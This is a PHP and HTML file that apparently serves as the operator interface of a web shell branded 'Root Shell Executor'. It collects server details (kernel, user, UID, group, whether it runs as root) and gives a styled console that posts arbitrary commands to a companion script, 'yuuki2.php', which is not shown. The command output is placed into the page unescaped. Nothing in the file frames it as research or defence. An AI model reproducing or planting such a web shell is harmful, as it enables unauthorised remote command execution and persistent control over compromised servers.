<?php
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}

$kernel = php_uname();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>⚡ Root Shell Executor ⚡</title>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: 'JetBrains Mono', 'JetBrains Mono', JetBrains Mono;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background-color: #1e1e1e;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0,0,0,0.5);
        }
        .header {
            text-align: center;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
            margin-bottom: 20px;
        }
        .header h2 {
            color: #f0f0f0;
            text-shadow: 0 0 5px rgba(255,255,255,0.3);
            margin: 0;
            font-size: 22px;
            letter-spacing: 1px;
        }
        .sys-info {
            background-color: #252525;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .cmd-form {
            margin-bottom: 20px;
        }
        .cmd-input {
            width: 100%;
            padding: 12px;
            background-color: #252525;
            border: 1px solid #444;
            color: #e0e0e0;
            font-family: monospace;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 10px;
            box-sizing: border-box;
        }
        .cmd-input:focus {
            outline: none;
            border-color: #666;
            box-shadow: 0 0 8px rgba(255,255,255,0.1);
        }
        .submit-btn {
            background-color: #333;
            color: white;
            border: none;
            padding: 12px 24px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.3s;
            font-weight: bold;
            width: 100%;
            border: 1px solid #444;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .submit-btn:hover {
            background-color: #444;
            box-shadow: 0 0 10px rgba(255,255,255,0.1);
        }
        .submit-btn:disabled {
            background-color: #252525;
            color: #666;
            cursor: not-allowed;
        }
        #shellrespon {
            background-color: #121212;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 15px;
            font-family: monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 500px;
            overflow-y: auto;
            color: #00ff00;
        }
        #shellrespon pre {
            margin: 0;
            font-family: inherit;
        }
        .status-badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: bold;
            margin-left: 5px;
        }
        .root-badge {
            background-color: #d32f2f;
            color: white;
        }
        .user-badge {
            background-color: #1976d2;
            color: white;
        }
        .blink {
            animation: blink-animation 1s steps(2, start) infinite;
        }
        @keyframes blink-animation {
            to { visibility: hidden; }
        }
        .prompt {
            color: #4CAF50;
            font-weight: bold;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h2>⚡ ROOT SHELL EXECUTOR ⚡</h2>
    </div>
    
    <div class="sys-info">
        <?php 
        $is_root = ($uid == 0) ? "<span class='status-badge root-badge'>ROOT</span>" : "<span class='status-badge user-badge'>USER</span>";
        echo "SYSTEM: $kernel<br>";
        echo "PRIVILEGES: $user (UID:$uid) | $group (GID:$gid) $is_root<br>";
        ?>
    </div>
    
    <form method="post" action="yuuki2.php" class="cmd-form">
        <input type='text' name="yuuki" id='yuuki' class="cmd-input" placeholder="Enter root command here..." autocomplete="off" autofocus>
        <button id="btn" type="submit" class="submit-btn">Execute Command <span class="blink">_</span></button>
    </form>
    
    <div id="shellrespon">
        <div class="prompt"><?php echo "$user@root-shell:~$ "; ?><span style="color:#fff">Ready for commands...</span></div>
    </div>
</div>

<script type="text/javascript">
    $(function(){
        // Focus the input field on page load
        $("#yuuki").focus();
        
        // Command history functionality
        var commandHistory = [];
        var historyIndex = -1;
        
        $("#yuuki").keydown(function(e) {
            if (e.keyCode == 38) { // Up arrow
                if (commandHistory.length > 0 && historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    $(this).val(commandHistory[commandHistory.length - 1 - historyIndex]);
                }
                e.preventDefault();
            } else if (e.keyCode == 40) { // Down arrow
                if (historyIndex > 0) {
                    historyIndex--;
                    $(this).val(commandHistory[commandHistory.length - 1 - historyIndex]);
                } else {
                    historyIndex = -1;
                    $(this).val('');
                }
                e.preventDefault();
            }
        });
        
        $("form").submit(function(){
            var cmd = $("#yuuki").val().trim();
            if (cmd.length < 1) {
                alert("Please enter a command before submitting");
                return false;
            }
            
            // Add to command history
            commandHistory.push(cmd);
            historyIndex = -1;
            
            // Display the command being executed
            var prompt = "<?php echo "$user@root-shell:~$ "; ?>";
            $("#shellrespon").prepend('<div class="prompt">' + prompt + '<span style="color:#fff">' + cmd + '</span></div>');
            
            $.ajax({
                url: $(this).attr("action"),
                data: $(this).serialize(),
                type: $(this).attr("method"),
                dataType: 'html',
                beforeSend: function() {
                    $("input").attr("disabled", true);
                    $("button").attr("disabled", true);
                    $("#btn").html('Executing...');
                },
                complete: function() {
                    $("input").attr("disabled", false);
                    $("button").attr("disabled", false);
                    $("#btn").html('Execute Command <span class="blink">_</span>');
                },
                success: function(hasil) {
                    $("#shellrespon").prepend('<pre>' + hasil + '</pre>');
                    $("form")[0].reset();
                    setTimeout(function(){
                        $("#yuuki").focus();
                    }, 100);
                },
                error: function(xhr, status, error) {
                    $("#shellrespon").prepend('<div style="color:#f44336">Error executing command: ' + error + '</div>');
                }
            });
            return false;
        });
    });
</script>
</body>
</html>
